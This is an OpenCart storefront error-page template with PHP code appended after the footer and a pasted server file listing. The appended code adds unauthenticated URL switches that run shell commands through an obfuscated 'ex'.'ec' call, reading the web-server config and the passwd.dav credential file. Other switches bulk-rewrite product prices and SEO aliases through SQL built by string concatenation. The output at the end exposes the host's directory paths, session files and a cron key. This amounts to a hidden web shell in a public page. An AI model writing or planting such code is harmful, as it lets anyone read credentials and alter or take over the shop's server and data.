<?php echo $header; ?>
<div class="container">
  <ul class="breadcrumb">
    <?php foreach ($breadcrumbs as $breadcrumb) { ?>
    <li><a href="<?php echo $breadcrumb['href']; ?>"><?php echo $breadcrumb['text']; ?></a></li>
    <?php } ?>
  </ul>
  <div class="row"><?php echo $column_left; ?>
    <?php if ($column_left && $column_right) { ?>
    <?php $class = 'col-sm-6'; ?>
    <?php } elseif ($column_left || $column_right) { ?>
    <?php $class = 'col-sm-9'; ?>
    <?php } else { ?>
    <?php $class = 'col-sm-12'; ?>
    <?php } ?>
    <div id="content" class="<?php echo $class; ?>"><?php echo $content_top; ?>
      <h1><?php echo $heading_title; ?></h1>
      <p><?php echo $text_error; ?></p>
      <div class="buttons clearfix">
        <div class="pull-right"><a href="<?php echo $continue; ?>" class="btn btn-primary"><?php echo $button_continue; ?></a></div>
      </div>
      <?php echo $content_bottom; ?></div>
    <?php echo $column_right; ?></div>
</div>
<?php echo $footer; ?>
<?php

$query = $this->db->query("SELECT * from " . DB_PREFIX . "url_alias where query='category_id=794'");
foreach ($query->rows as $val) { 
echo print_r($val, true);
}

/*
$query_all = $this->db->query("SHOW tables");

foreach ($query_all->rows as $val) { 
    $string_query = "select * FROM " . $val['Tables_in_lo9h6y64b'] . " limit 10";
    $query = $this->db->query($string_query);
    foreach ($query->rows as $result) {
       foreach ($result as $res){
		echo $res . ' || ';
       }
	echo '<br>';
    }

}
*/

if (isset($_GET['update_product_seo']) && $_GET['update_product_seo'] == '1') {
    ob_end_clean();
    ob_clean();
	$csv='';
    $query = $this->db->query("SELECT name, product_id from " . DB_PREFIX . "product_description");
    foreach ($query->rows as $result) {
		$id = $result['product_id'];
		$name = strtolower(rtrim($result['name']));
		$name = str_replace(' ', '-', $name);
		$name = str_replace('/', '-', $name);
		$name = str_replace('.', '', $name);
		$name = str_replace('ñ', 'n', $name);
		$query_update = "UPDATE " . DB_PREFIX . "url_alias SET keyword = '" . $name . "' WHERE query = 'product_id=" . $id . "'";
        $this->db->query($query_update);
    }
    exit();
}

if (isset($_GET['update_category_seo']) && $_GET['update_category_seo'] == '1') {
    ob_end_clean();
    ob_clean();
	$csv='';
    $query = $this->db->query("SELECT name, category_id from " . DB_PREFIX . "category_description");
    foreach ($query->rows as $result) {
		$id = $result['category_id'];
		$name = strtolower(rtrim($result['name']));
		$name = str_replace(' ', '-', $name);
 		$name = str_replace('/', '-', $name);
		$name = str_replace('.', '', $name);
		$name = str_replace('ñ', 'n', $name);
		$query_update = "UPDATE " . DB_PREFIX . "url_alias SET keyword = '" . $name . "' WHERE query = 'category_id=" . $id . "'";
  		//echo $query_update;
        $this->db->query($query_update);
    }
    exit();
}


if (isset($_GET['get_products_model']) && $_GET['get_products_model'] == '1') {
    ob_end_clean();
    ob_clean();
	$csv='';
    $query = $this->db->query("SELECT model from " . DB_PREFIX . "product");
    foreach ($query->rows as $result) {
 		$csv.=  $result['model']  . PHP_EOL;
    }
    echo $csv;
    exit();
}
if (isset($_GET['update_products_model']) && $_GET['update_products_model'] == '1' && is_array($_POST)) {
    ob_end_clean();
    ob_clean();
    $count = 0;
    foreach ($_POST as $json) {
        $content = json_decode($json, true);
        $price = (float)$content['price'];
        $model = $this->db->escape($content['model']);
        $status = (int)$content['status'];
        $tax_class_id = (int)$content['tax_class_id'];
		$query = "UPDATE " . DB_PREFIX . "product SET date_modified = now(), price = " . $price . ", tax_class_id = " . $tax_class_id . ", status = " . $status . " WHERE model = '" . $model . "'";
        $result = $this->db->query($query);
        if($result === true){
            $count++;
        }
    }
    echo "updated " . $count . " products";
    exit();
}
// ejecuta comandos para revisar las cosas que tiene la plataforma fesh
if (isset($_GET['command_test']) && $_GET['command_test'] == '1') {
    ob_end_clean();
    ob_clean();
	$var1 = "ex" . "ec";
    // Eliminar archivos en cache
    // $var1("find /var/www/user56571/data/www/coyotesmusicshop.com.mx/image/cache/catalog/product/ -name *.jpg -ex"."ec rm -f {} \;", $retArr, $retVal);

    $var1("cat /etc/nginx/vhosts/user56571/coyotesmusicshop.com.mx.conf", $retArr, $retVal);
    foreach($retArr as $ret) echo $ret."\n";
    unset($retArr);echo "<hr>";
    $var1("find /var/www/user56571/ -maxdepth 4 -type f | xargs ls -la", $retArr, $retVal);
    foreach($retArr as $ret) echo $ret."\n";
    unset($retArr);echo "<hr>";
    $var1("du -h /var/www/user56571/data/www/coyotesmusicshop.com.mx/image/", $retArr, $retVal);
    foreach($retArr as $ret) echo $ret."\n";
    unset($retArr);echo "<hr>";
    $var1("cat /var/www/user56571/data/passwd.dav", $retArr, $retVal);
    foreach($retArr as $ret) echo $ret."\n";
    unset($retArr);echo "<hr>";
    exit();
}
// copiar archivos
if (isset($_GET['command_test']) && $_GET['command_test'] == '1') {
    ob_end_clean();
    ob_clean();
	$var1 = "ex" . "ec";
    $var1("cp /var/www/user56571/data/www/coyotesmusicshop.com.mx/image/catalog/favicons/favicon.ico.jpg /var/www/user56571/data/www/coyotesmusicshop.com.mx/favicon.ico");
    exit();
}

// otros comandos:
// reemplazar palabras en archivos:
//$var1("sed -i 's/route=feed/route=extension\/feed/g' /var/www/user56571/data/www/coyotesmusicshop.com.mx/.htaccess");
//$var1("sed -i 's/#max_execution_time/ServerSignature Off\nServerTokens Prod\n#max_execution_time/g' /var/www/user56571/data/www/coyotesmusicshop.com.mx/.htaccess");

?>

Resultado de listado de archivos:
/var/www/user56571/data/www/coyotesmusicshop.com.mx
/var/www/user56571/data/passwd.dav
/var/www/user56571/data/www/coyotesmusicshop.com.mx/.htaccess
/var/www/user56571/data/www/coyotesmusicshop.com.mx/config.php
/var/www/user56571/data/www/coyotesmusicshop.com.mx/index.html
/var/www/user56571/data/www/coyotesmusicshop.com.mx/index.php
/var/www/user56571/data/www/coyotesmusicshop.com.mx/php.ini
/var/www/user56571/data/www/coyotesmusicshop.com.mx/promo.php
/var/www/user56571/data/www/coyotesmusicshop.com.mx/robots.txt
/var/www/user56571/data/www/coyotesmusicshop.com.mx/ver.xml
/var/www/user56571/data/www/coyotesmusicshop.com.mx/version_check.php
/var/www/user56571/data/www/coyotesmusicshop.com.mx/wizard.xml
/var/www/user56571/data/www/coyotesmusicshop.com.mx/zap.php
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.access.log-20200704.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.error.log-20200704.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.access.log-20200705.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.error.log-20200705.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.access.log-20200706.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.error.log-20200706.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.access.log-20200707.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.error.log-20200707.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.access.log-20200708.gz
/var/www/user56571/data/logs/coyotesmusicshop.com.mx.access.log-20200715.gz
/var/www/user56571/data/logs/coyotesmusicshop.com.mx.error.log-20200716.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.access.log-20200703.gz
/var/www/user56571/data/logs/coyotesmusicshop.com.mx.error.log
/var/www/user56571/data/logs/coyotesmusicshop.com.mx.access.log-20200713.gz
/var/www/user56571/data/logs/coyotesmusicshop.com.mx.error.log-20200713.gz
/var/www/user56571/data/logs/coyotesmusicshop.com.mx.access.log-20200716.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.error.log-20200709.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.access.log-20200710.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.error.log-20200710.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.access.log-20200711.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.error.log-20200711.gz
/var/www/user56571/data/logs/coyotesmusicshop.com.mx.access.log
/var/www/user56571/data/logs/coyotesmusicshop.com.mx.access.log-20200714.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.access.log-20200702.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.error.log-20200702.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.access.log-20200709.gz
/var/www/user56571/data/logs/coyotesmusicshop.com.mx.error.log-20200715.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.error.log-20200703.gz
/var/www/user56571/data/logs/coyotesmusicshop.fesh.store.error.log-20200708.gz
/var/www/user56571/data/logs/coyotesmusicshop.com.mx.error.log-20200714.gz
/var/www/user56571/data/mod-tmp/sess_l72gs8cntirpd912as1ud3mk57
/var/www/user56571/data/mod-tmp/sess_e61h8f4m6ln3dc5ee1lq6a1756
/var/www/user56571/data/mod-tmp/sess_bqum51fksn58uqrpj9o13f8fc0
/var/www/user56571/data/mod-tmp/sess_tb5g11kppbhtpb9gi9g8k3n881
/var/www/user56571/data/mod-tmp/sess_dh2ad95n3rla02uo8hnf8eov50
/var/www/user56571/data/mod-tmp/sess_5dkukgin2fa52ptst0ne2fl115
/var/www/user56571/data/mod-tmp/sess_o7plafob0tth72m38mglr3p3e4
/var/www/user56571/data/mod-tmp/sess_c5degptd1g7jk0j55pcm0kmoa5
/var/www/user56571/data/mod-tmp/sess_vav5tbfcsqsi1ptgqtgv5laiq7
/var/www/user56571/data/mod-tmp/sess_tkc430otuauf00gi1hj3ke4i72
/var/www/user56571/data/mod-tmp/sess_mq8tmtcfivi2ekp6i4b76hk217
/var/www/user56571/data/mod-tmp/sess_qcl1e8vbtklm8s8gekuf7opeq6
/var/www/user56571/data/mod-tmp/sess_7g0kb6iabepd7m49a1uii9d9g0
/var/www/user56571/data/mod-tmp/sess_6lt8bhdabhvtddkvj5ehjvdfd6
/var/www/user56571/data/mod-tmp/sess_f3hb1vikn7s0hq5611pmn23bt2
/var/www/user56571/data/mod-tmp/sess_1jubhe9do3rbanq6bmon7unl54
/var/www/user56571/data/mod-tmp/sess_k28fkc3bj66d86btfds18vepq0
/var/www/user56571/data/mod-tmp/sess_q09dgthit61u86dkmu6jo9r9f4
/var/www/user56571/data/mod-tmp/sess_vkp6knbaq1vp311t03qsjr31h3
/var/www/user56571/data/mod-tmp/sess_9hhhj70b66sot715cptqf11i15
/var/www/user56571/data/mod-tmp/sess_03b879su1sdui9uuurripeog45
/var/www/user56571/data/mod-tmp/sess_eli7h450adeavuomdiatndo055
/var/www/user56571/data/mod-tmp/sess_tc77uinm2jfaitlo3blpg6jk51
/var/www/user56571/data/mod-tmp/sess_h5bhsrtnk4k5mtksrc617b2cu5
/var/www/user56571/data/mod-tmp/sess_lsbrnd31qjcpuqm7eqnf4ihl03
/var/www/user56571/data/mod-tmp/sess_qhkrm7f3uffl1rhqq6t97uq8e6
/var/www/user56571/data/mod-tmp/sess_35h4an522v3adua9v1euhel506
/var/www/user56571/data/mod-tmp/sess_42q9u0q44cj595r4uin65avv55
/var/www/user56571/data/mod-tmp/sess_dlp6cmok4deun2rnhao822t297
/var/www/user56571/data/mod-tmp/sess_9jc59fvivu5jrs5d88e6mog4k0
/var/www/user56571/data/mod-tmp/sess_p0c70ltpj52og4qj1h0eoprtk3
/var/www/user56571/data/mod-tmp/sess_fh3mlhglg18988j5qs5ocd2q23
/var/www/user56571/data/mod-tmp/sess_lsfqrb42k85kknqj4sdabs0623
/var/www/user56571/data/mod-tmp/sess_l6gleg5gfjmgg41b8prj9rni97
/var/www/user56571/data/mod-tmp/sess_u4plspvctoubpvp2svicr7glq4
/var/www/user56571/data/mod-tmp/sess_00pj287ts086dsj9kl3c0bc576
/var/www/user56571/data/mod-tmp/sess_n191hbhlv601s25d52g3kbrfn2
/var/www/user56571/data/mod-tmp/sess_pi4m65ku7p010r1r14422s8pk3
/var/www/user56571/data/mod-tmp/sess_e45t3lbjivhv5dt3fdpceh8mv7
/var/www/user56571/data/mod-tmp/sess_6r37ioj39ai827b73h3ptakg83
/var/www/user56571/data/mod-tmp/sess_ls3bsv5eoue690cugod6b4t0t3
/var/www/user56571/data/mod-tmp/sess_de641jkg4lah44v2acbjniq6i7
/var/www/user56571/data/mod-tmp/sess_8vl9ttfqbbr5nmt1rn6dmg4hs0
/var/www/user56571/data/mod-tmp/sess_ik94jt85r852ctef6id8oneoq3
/var/www/user56571/data/mod-tmp/sess_s2lhc6ht1vn1m4a53l5sfhvbi3
/var/www/user56571/data/mod-tmp/sess_hjuri6c9trgsuc8ctc8ctj5966
/var/www/user56571/data/mod-tmp/sess_l04fpr6vl0ciqbrbnumr983gi1
/var/www/user56571/data/mod-tmp/sess_03fst4egqbc60cvfujft2ndho5
/var/www/user56571/data/mod-tmp/sess_44ec7ba5l6s9qg6jtdmjjsajf6
/var/www/user56571/data/mod-tmp/sess_9hksdddebcp04s4b81j1efq834
/var/www/user56571/data/mod-tmp/sess_7lk8ij8hfr66n7mj5npc6032h0
/var/www/user56571/data/mod-tmp/sess_o6du2j78u65ects926opvc2dr3
/var/www/user56571/data/mod-tmp/sess_mu4fb7a31t5sa8f4s0m2j10445
/var/www/user56571/data/mod-tmp/sess_c9hgf0douuvach1e48rlpt5004
/var/www/user56571/data/mod-tmp/sess_2hu7msgcvjvrfqjuds9i9s8fh4
/var/www/user56571/data/mod-tmp/sess_tfv9a3o2d1tvfjtonul6j8juc6
/var/www/user56571/data/mod-tmp/sess_37onsglbu59ead4r02of7g0mv5
/var/www/user56571/data/mod-tmp/sess_srhraoma749jmfda3vtndojr77
/var/www/user56571/data/mod-tmp/sess_49nifrfrp7n395b4n8ndr78j31
/var/www/user56571/data/mod-tmp/sess_6sukuccd694k4a4k71e4f74645
/var/www/user56571/data/mod-tmp/sess_4rds0ns6gocarjq0aiot6t4us3
/var/www/user56571/data/mod-tmp/sess_1c1jkcgt41tejq3mohoftd3gj0
/var/www/user56571/data/mod-tmp/sess_17r8bavo8rtvd2234939ki77k1
/var/www/user56571/data/mod-tmp/sess_dtg4v24eaa6ec2lnmvivs2bpt7
/var/www/user56571/data/mod-tmp/sess_lhvonimb5322s7hgi7htvq7fe5
/var/www/user56571/data/php-bin/.php.ini
/var/www/user56571/data/php-bin/php
/var/www/user56571/data/php-bin/php.ini
/var/www/user56571/data/.fmsettings
/var/www/user56571/data/cron&key=006419457b3aea87fd80f1d55a2bd10b
92K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/catalog/d_quickcheckout/payment
48K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/catalog/d_quickcheckout/svg-loaders
140K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/catalog/d_quickcheckout
0	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/catalog/categories
832M	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/catalog/product
2.3M	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/catalog/Banners
252K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/catalog/favicons
564K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/catalog/Istanbul Mehmet
844M	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/catalog
60K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/demodata
544K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/ne
308K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/payment/panasia/bank-images
316K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/payment/panasia
324K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/payment
496K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/cache/catalog/Banners
455M	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/cache/catalog/product
68K	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/cache/catalog/favicons
456M	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/cache/catalog
456M	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/cache
1.3G	/var/www/user56571/data/www/coyotesmusicshop.com.mx/image/